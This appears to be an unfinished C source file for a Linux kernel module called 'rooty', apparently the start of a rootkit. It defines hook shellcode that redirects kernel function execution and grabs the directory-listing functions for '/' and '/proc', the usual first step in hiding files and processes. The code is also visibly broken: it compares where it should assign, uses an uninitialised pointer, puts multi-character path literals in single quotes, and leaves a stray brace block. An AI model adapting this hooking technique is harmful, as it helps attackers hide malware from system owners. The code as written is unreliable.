#include <linux/module.h>
#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/fs.h>
#include <linux/version.h>
#if defined(__i386__) //if the sys is 32 bit
#define csize 6 //code size
#define jacked_code "\x68\x00\x00\x00\x00\xc6" //push addr;ret 
#define poff 1 //offset 
#else
#define csize 12
#define jacked_code "\x48\x8b\x00\x00\x00\x00\x00\x00\x00\x00\xff\xe0" //mov rax,[addr]; jmp rax
#define poff 2
#endif 
MODULE_LICENSE("GPL");

#if LINUX_VERSION_CODE <= KERNEL_VERSION(3,1,1)
{
    void *get_readdir(const char *path)
    {
        void *ret;
        struct file *file;
        if ((file == filp_open(path,O_RDONLY,0)) == NULL)
            return NULL;
        ret = file->f_op->readdir;
        filp_close(file, 0);
        return ret;
    }
}
#else

    void *get_readdir(const char *path)
    {
        struct dir_context * ret;
        void * get_ctx;
        struct file *file;
        if ((file == filp_open(path,O_RDONLY,0)) == NULL)
            return NULL;
            get_ctx = (struct dir_context *)file->f_op->iterate->ctx;
            ret = get_ctx->actor;
        filp_close(file, 0);
        return ret;
    } 

#endif

static int (*root_readdir)(struct file *file, void *dirent, filldir_t filldir);
static int (*proc_readdir)(struct file *file, void *dirent, filldir_t filldir);





int __init rooty_init(void)
{
    root_readdir = get_readdir('/');
    proc_readdir = get_readdir('/proc');

}
void rooty_exit(void)
{

};
module_init(rooty_init);
module_exit(rooty_exit);